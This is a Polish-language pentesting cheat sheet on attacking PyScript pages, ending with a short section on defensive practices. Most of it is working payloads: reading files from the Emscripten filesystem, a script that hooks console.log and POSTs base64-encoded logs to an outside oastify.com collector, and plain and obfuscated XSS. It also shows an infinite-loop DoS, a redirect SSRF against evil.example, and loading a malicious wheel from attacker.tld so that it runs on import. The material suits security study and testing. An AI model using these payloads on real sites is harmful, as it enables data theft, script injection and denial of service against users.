# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Przewodnik po pentestingu PyScript

PyScript to nowy framework opracowany do integrowania Pythona z HTML, dzięki czemu może być używany razem z HTML. W tym cheat sheet znajdziesz informacje o tym, jak używać PyScript do celów pentestingu.

### Zrzucanie / pobieranie plików z wirtualnego systemu plików pamięci Emscripten:

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Wynik:

![PyScript Pentesting Guide - Zrzucanie / pobieranie plików z wirtualnego systemu plików Emscripten: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration wirtualnego systemu plików Emscripten (monitorowanie konsoli)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Kod:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Wynik:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinary)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Wynik:

![Eksfiltracja danych OOB z wirtualnego systemu plików pamięci Emscripten (monitorowanie konsoli) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Kod:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Wynik:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Kod:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Wynik:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (pętla nieskończona)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (pętla nieskończona)

Kod:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Wynik:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Nowe luki i techniki (2023-2025)

### Server-Side Request Forgery przez niekontrolowane przekierowania (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` ignoruje parametry żądania `redirect` i `retries` używane z transportem przeglądarkowym Pyodide. Jeśli atakujący może wpływać na docelowe URL-e, kod może wykonywać przekierowania między domenami, nawet gdy zażąda się od urllib3 ich wyłączenia, osłabiając zabezpieczenia przed SSRF.<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Zaktualizuj `urllib3 >= 2.5.0` dla Node.js, ale nie polegaj na urllib3 w celu wyłączania przekierowań w przeglądarkach; przed wykonaniem żądań sprawdzaj miejsca docelowe lub zezwalaj wyłącznie na miejsca z allow-listy.<sup>[[4]](#references)</sup>

### Ładowanie dowolnych pakietów i ataki na łańcuch dostaw

Konfiguracja Pyodide w PyScript akceptuje dowolne adresy URL plików wheel w `packages`; jeśli atakujący może zmodyfikować tę konfigurację lub wstrzyknąć do niej dane, kolejny import może uruchomić kontrolowany przez atakującego kod Python w przeglądarce ofiary.<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide może instalować pure-Python wheels z dowolnych URL-i bez kompilowania pakietu do WebAssembly.<sup>[[6]](#references)</sup> Ta konfiguracja powinna pozostawać pod kontrolą developera; należy zezwalać na dokładnie określone nazwy pakietów lub URL-e oraz weryfikować sumy kontrolne zdalnych wheels podczas builda lub wdrażania.

### Zmiany dotyczące sanityzacji danych wyjściowych (2023+)

* W implementacji `2022.05.1` używanej przez starsze przykłady `print()` zapisuje dane wyjściowe `text/plain` bez escapowania HTML, przez co jest podatne na XSS.<sup>[[8]](#references)</sup>
* Obecny helper `display()` **domyślnie wykonuje escaping HTML** dla zwykłych stringów; surowy markup musi być opakowany w `pyscript.HTML()`.<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Używaj `display()` dla niezaufanych danych wejściowych i nie przekazuj niezaufanych ciągów znaków do `HTML()`.<sup>[[2]](#references)</sup>

---

## Najlepsze praktyki obronne

* **Aktualizuj pakiety** – używaj `urllib3 >= 2.5.0` w Node.js i osobno weryfikuj założenia dotyczące przekierowań w przeglądarce.<sup>[[4]](#references)</sup>
* **Ogranicz źródła pakietów** – stosuj allow-listę nazw PyPI lub dokładnych zaufanych URL-i oraz weryfikuj digesty zdalnych wheel podczas kompilacji lub wdrażania.<sup>[[5]](#references)[[6]](#references)</sup>
* **Wzmocnij Content Security Policy** – zablokuj inline JavaScript (`script-src 'self' 'sha256-…'`), aby wstrzyknięte bloki `<script>` nie mogły zostać wykonane.
* **Zabroń tagów `<py-script>` / `<script type="py">` dostarczanych przez użytkownika** – sanityzuj HTML na serwerze przed odesłaniem go innym użytkownikom.
* **Izoluj workery** – jeśli nie potrzebujesz synchronicznego dostępu workerów do DOM, włącz flagę `sync_main_only`, aby uniknąć `SharedArrayBuffer` i powiązanych z nim wymagań dotyczących nagłówków CORS.<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [Dokumentacja wbudowanych funkcji PyScript – `display` i `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy – Sztuka łączenia podatności (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [Poradnik bezpieczeństwa urllib3 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [Dokumentacja konfiguracji PyScript – packages i `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – ładowanie pakietów](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [Implementacja `pyscript.py` w PyScript 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
